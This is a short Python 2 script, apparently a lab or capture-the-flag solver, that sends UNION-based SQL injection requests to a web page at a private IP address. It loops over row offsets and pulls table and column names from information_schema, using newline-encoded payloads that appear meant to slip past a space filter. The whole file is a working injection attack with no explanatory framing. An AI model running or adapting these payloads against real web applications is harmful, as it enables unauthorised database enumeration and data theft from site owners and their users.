import urllib2


for i in range(0,1000):
    url = "http://192.168.50.6:30465/index.php?id=100%20union%20select%20table_name%20from%20information_schema.tables%20limit%20{0},1".format(i)
    url ="http://192.168.50.6:30465/index.php?id=100%0Aunion%0ASELECT%0ADISTINCT%0ACONCAT%28TABLE_NAME%2C%0A%27%0A%27%2C%0ACOLUMN_NAME%29%0AFROM%0AINFORMATION_SCHEMA.COLUMNS%0Alimit%0A{0}%2C1".format(i)
    print urllib2.urlopen(url).read()

